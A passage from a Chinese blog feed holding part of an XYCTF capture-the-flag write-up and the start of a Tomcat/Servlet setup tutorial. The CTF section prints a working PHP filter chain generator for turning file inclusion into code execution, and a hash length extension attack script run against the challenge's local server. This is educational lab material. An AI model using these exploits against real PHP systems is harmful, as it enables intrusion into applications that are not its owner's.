class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    encoded_chain = chain</span><br><span class="line">    <span class="comment"># generate some garbage base64</span></span><br><span class="line">    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:</span><br><span class="line">        <span class="comment"># don&#x27;t add the decode while debugging chains</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Parsing command line arguments</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;PHP filter chain generator.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&quot;--chain&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--rawbase64&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.chain <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        chain = args.chain.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        base64_value = base64.b64encode(chain).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        chain = generate_filter_chain(base64_value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(args.chain, base64_value))</span><br><span class="line">        <span class="built_in">print</span>(chain)</span><br><span class="line">    <span class="keyword">if</span> args.rawbase64 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        rawbase64 = args.rawbase64.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">match</span>):</span><br><span class="line">            chain = generate_filter_chain(rawbase64, <span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(chain)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[-] Base64 string required.&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>把XYCTF多base64encode几次,然后用脚本生成payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain Vm1wQ1lXTXhTa2RYYTFwWVZWRQ</span><br></pre></td></tr></table></figure><p>得到的payload多加五个base64-decode即可</p><h2 id="ezLFI"><a href="#ezLFI" class="headerlink" title="ezLFI"></a>ezLFI</h2><p>这题可以用php_filter_chain直接解掉了, 但是考点看起来应该是nginx fast-cgi响应过大产生临时文件的那个trick</p><p><a href="https://tttang.com/archive/1384/#toc_0x02-includers-revenge-nginx-fastcgi-temp-lfi">https://tttang.com/archive/1384/#toc_0x02-includers-revenge-nginx-fastcgi-temp-lfi</a></p><p>后面补一下吧</p><h2 id="give-me-flag-赛后"><a href="#give-me-flag-赛后" class="headerlink" title="give me flag(赛后)"></a>give me flag(赛后)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line">cc584e52a25c194614d8f8dff57c7f72</span><br></pre></td></tr></table></figure><p>一眼哈希扩展攻击, hashpump没了, 装了hexpand,一直报段错误….遂放弃</p><p>推荐另一个项目</p><p><a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p><p>可以在下面一个连接直接查看当前unix时间戳</p><p><a href="https://tool.chinaz.com/tools/unixtime.aspx">https://tool.chinaz.com/tools/unixtime.aspx</a></p><p>稍微预测一个提前量:</p><p>1714286382</p><p>1714286700</p><p>扩展md5</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428144622394.png" alt="image-20240428144622394"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:55475/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;?md5=e84fbfa78340af6d44eedfd75c59445d&amp;value=%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res=requests.get(url=url+payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;wait..&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;XYCTF&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428144636517.png" alt="image-20240428144636517"></p><h2 id="baby-unserialize-未解出"><a href="#baby-unserialize-未解出" class="headerlink" title="baby_unserialize(未解出)"></a>baby_unserialize(未解出)</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 命令注入 </tag>
            
            <tag> ssti </tag>
            
            <tag> phar反序列化 </tag>
            
            <tag> LFI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Web基础</title>
      <link href="/2024/04/07/Java-Web%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/04/07/Java-Web%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-Web"><a href="#Java-Web" class="headerlink" title="Java Web"></a>Java Web</h1><h2 id="Tomcat＋Servlet"><a href="#Tomcat＋Servlet" class="headerlink" title="Tomcat＋Servlet"></a>Tomcat＋Servlet</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>不同java版本对应的tomcat和servlet不太一样, 这里搭配如下:</p><p>java 1.8</p><p>Servlet 3.1.0</p><p>Tomcat 8</p><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Tomcat-Servlet_Demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>手动创建war包目录</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428235641031.png" alt="image-20240428235641031"></p><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">web-app</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其他细节参考"><a href="#其他细节参考" class="headerlink" title="其他细节参考"></a>其他细节参考</h3><p><a href="https://www.jianshu.com/p/b4b42a90b2e9">https://www.jianshu.com/p/b4b42a90b2e9</a></p><p><a href="https://blog.csdn.net/qq_52057693/article/details/124260380">https://blog.csdn.net/qq_52057693/article/details/124260380</a></p><h3 id="编写代码"><a href="#编写代码" class="headerlink" 